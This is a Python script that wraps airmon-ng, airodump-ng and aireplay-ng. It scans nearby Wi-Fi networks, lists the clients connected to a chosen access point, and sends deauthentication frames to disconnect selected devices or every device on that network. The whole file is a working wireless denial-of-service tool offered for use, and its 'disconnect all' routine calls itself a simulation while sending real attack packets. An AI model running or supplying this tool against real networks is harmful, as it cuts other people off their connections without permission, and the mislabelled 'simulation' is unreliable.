#!/usr/bin/env python3

import subprocess
import time
import csv
import glob
import os


def start_monitor_mode(interface="wlan0"):
    print(f"[+] Starting monitor mode on {interface}...")
    subprocess.run(
        ["sudo", "airmon-ng", "start", interface],
        check=True
    )

def get_latest_scan_csv(prefix="scan"):
    pattern = f"{prefix}-*.csv"
    files = glob.glob(pattern)
    if not files:
        return None
    latest = max(files, key=os.path.getmtime)
    return latest

# ------------------------------
# AP (network) discovery
# ------------------------------

def run_airodump_for_aps(mon_iface="wlan0mon", duration=10, prefix="scan"):
    print(f"[+] Running airodump-ng on {mon_iface} for {duration} seconds (AP scan)...")
    proc = subprocess.Popen(
        [
            "sudo", "airodump-ng", mon_iface,
            "--write", prefix,
            "--output-format", "csv"
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    time.sleep(duration)
    proc.terminate()
    proc.wait()
    print("[+] AP capture finished, scan CSV should be created")

def parse_networks_from_csv(csv_file):
    networks = []
    with open(csv_file, newline='') as f:
        reader = csv.reader(f)
        for row in reader:
            if not row:
                continue
            if row[0].strip() == "BSSID":
                continue
            if row[0].strip() == "Station MAC":
                break
            if row[0].strip() == "":
                continue

            bssid   = row[0].strip()
            channel = row[3].strip()
            privacy = row[5].strip()
            essid   = row[13].strip()

            networks.append({
                "bssid": bssid,
                "channel": channel,
                "enc": privacy,
                "essid": essid,
            })
    return networks

def choose_network(networks):
    if not networks:
        print("No networks found.")
        return None

    print("\nID  CH  ENC           BSSID              ESSID")
    print("--  --  ------------- -----------------  --------------------------")
    for i, net in enumerate(networks):
        print(f"{i:2}  {net['channel']:>2}  {net['enc']:<13} {net['bssid']:<18}  {net['essid']}")

    while True:
        choice = input("\nChoose network ID: ")
        if not choice.isdigit():
            print("Please enter a number.")
            continue
        idx = int(choice)
        if 0 <= idx < len(networks):
            chosen_network = networks[idx]
            return chosen_network
        else:
            print("Invalid ID, try again.")

# ------------------------------
# Client discovery for chosen AP
# ------------------------------

def run_airodump_for_clients(mon_iface, channel, bssid, duration=15, prefix="clients"):
    
    # Run airodump-ng focused on a specific AP (BSSID + channel)
    # to capture client stations into a CSV.
    
    print(f"[+] Running airodump-ng on {mon_iface} (CH: {channel}, BSSID: {bssid}) for {duration} seconds (clients)...")
    proc = subprocess.Popen(
        [
            "sudo", "airodump-ng", mon_iface,
            "-c", channel,
            "--bssid", bssid,
            "--write", prefix,
            "--output-format", "csv"
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    time.sleep(duration)
    proc.terminate()
    proc.wait()
    print("[+] Client capture finished, clients CSV should be created")

def parse_clients_from_csv(csv_file, target_bssid):
    clients = []
    with open(csv_file, newline='') as f:
        reader = csv.reader(f)
        in_client_section = False

        for row in reader:
            if not row:
                continue

            first = row[0].strip()
            if first == "Station MAC":
                in_client_section = True
                continue

            if not in_client_section:
                continue

            if first == "":
                continue 

            # Expected columns in station rows:
            # 0: Station MAC
            # 5: BSSID (AP)
            station_mac = row[0].strip()
            bssid       = row[5].strip()

            if bssid.lower() != target_bssid.lower():
                continue

            power   = row[3].strip() if len(row) > 3 else ""
            packets = row[4].strip() if len(row) > 4 else ""

            clients.append({
                "mac": station_mac,
                "bssid": bssid,
                "power": power,
                "packets": packets,
            })

    return clients

def choose_clients(clients):
    
    if not clients:
        print("No clients found for this network.")
        return []

    print("\nID  POWER  PACKETS  CLIENT MAC")
    print("--  -----  -------  -----------------")
    for i, c in enumerate(clients):
        print(f"{i:2}  {c['power']:>5}  {c['packets']:>7}  {c['mac']}")

    print("\nEnter one or more IDs separated by spaces or commas:")
    while True:
        raw = input("Client IDs: ").strip()
        if not raw:
            print("Please enter at least one ID.")
            continue

        # Allow "0 1 2" or "0,1,2"
        raw_ids = raw.replace(",", " ").split()
        indices = []
        ok = True
        for r in raw_ids:
            if not r.isdigit():
                print(f"'{r}' is not a valid number.")
                ok = False
                break
            idx = int(r)
            if not (0 <= idx < len(clients)):
                print(f"ID {idx} is out of range.")
                ok = False
                break
            indices.append(idx)

        if not ok:
            continue

        seen = set()
        result = []
        for idx in indices:
            if idx not in seen:
                seen.add(idx)
                result.append(clients[idx])

        return result


def disconnect_specific_devices(selected_network, mon_iface="wlan0mon"):
  
    bssid = selected_network["bssid"]
    channel = selected_network["channel"]

    # Capture clients on this BSSID+channel
    run_airodump_for_clients(mon_iface, channel, bssid, duration=15, prefix="clients")

    # Find latest clients CSV
    csv_file = get_latest_scan_csv("clients")
    if not csv_file:
        print("[-] No clients CSV found. Did airodump-ng run correctly?")
        return

    print(f"[+] Using clients CSV file: {csv_file}")

    # 3) Parse clients
    clients = parse_clients_from_csv(csv_file, target_bssid=bssid)

    # 4) Let user choose one or more clients
    chosen_clients = choose_clients(clients)
    if not chosen_clients:
        print("[-] No clients selected.")
        return

    print("\n[+] You selected these client(s):")
    for c in chosen_clients:
        print(f"    {c['mac']} (BSSID: {c['bssid']}, POWER: {c['power']}, PACKETS: {c['packets']})")

    number_of_packets = "15"  # Should be string for subprocess

    for c in chosen_clients: 
        subprocess.run(
            ["sudo", "aireplay-ng", "--deauth", number_of_packets,
            "-a", bssid, "-c", c["mac"], mon_iface],  # Use 'c' directly, not chosen_clients[c]
            check=True
        )  
    print("Disconnect attack was sucessful")  


def disconnect_all_devices(selected_network, mon_iface="wlan0mon"):
    
    bssid = selected_network["bssid"]
    channel = selected_network["channel"]
    essid = selected_network["essid"]
    number_of_packets = '50'

    print("\n[+] (Simulation) You chose to affect ALL clients on:")
    print(f"    ESSID : {essid}")
    print(f"    BSSID : {bssid}")
    print(f"    CH    : {channel}")

    
    subprocess.run(["sudo", "iwconfig", "wlan0mon", "channel", selected_network['channel']])

    try:
        result = subprocess.run(
            ["sudo", "aireplay-ng", "--deauth", number_of_packets,
            "-a", bssid, mon_iface],
            check=True,
            capture_output=True,   
            text=True              
        )
        print("[+] Command succeeded")
        print("STDOUT:\n", result.stdout)

    except subprocess.CalledProcessError as e:
        print("[-] Command failed with code:", e.returncode)
        print("STDOUT:\n", e.stdout)
        print("STDERR:\n", e.stderr) 

# ------------------------------
# Main flow
# ------------------------------

def main():
    # Start monitor mode
    start_monitor_mode("wlan0")

    # Run airodump-ng and capture AP CSV
    run_airodump_for_aps("wlan0mon", duration=10, prefix="scan")

    # Find latest AP scan CSV
    csv_file = get_latest_scan_csv("scan")
    if not csv_file:
        print("[-] No scan CSV found. Did airodump-ng run correctly?")
        return

    print(f"[+] Using AP CSV file: {csv_file}")

    # Parse networks
    nets = parse_networks_from_csv(csv_file)

    # Let the user choose a network
    selected = choose_network(nets)
    if not selected:
        return

    print("\n[+] You selected this network:")
    print(f"    ESSID : {selected['essid']}")
    print(f"    BSSID : {selected['bssid']}")
    print(f"    CH    : {selected['channel']}")
    print(f"    ENC   : {selected['enc']}")

    # Ask what the user wants to do next
    print("\nPlease choose the next step:")
    print("  1) Disconnect a specific device or defined list of devices")
    print("  2) Disconnect all devices on this network")
    print("  3) Exit")

    while True:
        choice = input("Choose option [1/2/3]: ").strip()
        if choice == "1":
            disconnect_specific_devices(selected, mon_iface="wlan0mon")
            break
        elif choice == "2":
            disconnect_all_devices(selected, mon_iface="wlan0mon")
            break
        elif choice == "3":
            print("Exiting.")
            break
        else:
            print("Invalid option, please choose 1, 2, or 3.")

if __name__ == "__main__":
    main()
